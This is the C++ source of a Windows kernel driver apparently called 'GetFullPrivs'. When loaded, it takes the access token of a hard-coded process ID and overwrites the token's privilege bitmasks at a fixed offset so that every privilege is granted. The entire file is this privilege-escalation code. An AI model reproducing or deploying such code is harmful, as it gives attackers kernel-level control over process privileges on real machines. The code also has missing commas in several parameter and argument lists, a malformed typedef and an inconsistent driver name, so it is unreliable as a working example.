#include <ntifs.h>

#define DRIVER_PREFIX "GetFullPrivsDrv: "
#define DEVICE_PATH L"\\Device\\GetFullPrivs"
#define SYMLINK_PATH L"\\??\\GetFullPrivs"

#define VALID_PRIVILEGE_MASK 0x0000001FFFFFFFFCULL

//
// Global Variables
//
ULONG g_PrivilegesOffset = 0x40u;
UINT32 processPid = 2524;

//
// Enum definition
//

//
// Struct definition
//
typedef struct _SEP_TOKEN_PRIVILEGES
{
	ULONGLONG Present;
	ULONGLONG Enabled;
	ULONGLONG EnabledByDefault;
} SEP_TOKEN_PRIVILEGES * PSEP_TOKEN_PRIVILEGES;

//
// Prototypes
//
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject);

//
// Driver routines
//
extern "C"
NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT  DriverObject
	_In_ PUNICODE_STRING RegistryPath)
{
	/* Local variables */
	PEPROCESS Process = nullptr;
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY;

	/* Set unload callback */
	DriverObject->DriverUnload = DriverUnload;

	/* Print driver load OK */
	KdPrint((DRIVER_PREFIX "Driver is loaded successfully.\n"));

	/* Get process info using provided pid */
	auto pid = ::ULongToHandle((ULONG)processPid);
	KdPrint((DRIVER_PREFIX "pid value: %d.\n" pid));
	ntstatus = ::PsLookupProcessByProcessId(pid &Process);

	if (!NT_SUCCESS(ntstatus))
	{
		KdPrint((DRIVER_PREFIX "Failed to PsLookupProcessByProcessId() (NTSTATUS = 0x%08X).\n" ntstatus));
	}
	else
	{
		PACCESS_TOKEN pPrimaryToken = ::PsReferencePrimaryToken(Process);
		auto pSepToken = (PSEP_TOKEN_PRIVILEGES)((ULONG_PTR)pPrimaryToken + g_PrivilegesOffset);

		KdPrint((DRIVER_PREFIX "Primary token for PID %u is at %p.\n" ::HandleToULong(pid) pPrimaryToken));
		KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is at %p.\n" ::HandleToULong(pid) pSepToken));

		pSepToken->Present = VALID_PRIVILEGE_MASK;
		pSepToken->Enabled = VALID_PRIVILEGE_MASK;
		pSepToken->EnabledByDefault = VALID_PRIVILEGE_MASK;

		KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is overwritten successfully.\n" HandleToULong(pid)));

	}

	return ntstatus;
}

VOID
DriverUnload(
	_In_    PDRIVER_OBJECT      pDriverObject                                           // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
)
{
	// Preventing compiler warnings for unused parameter
	UNREFERENCED_PARAMETER(pDriverObject);

	// Print a debug message to indicate the driver has been unloaded
	DbgPrint("SetPrivs1: Unloading... Service has stopped");							// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint
}


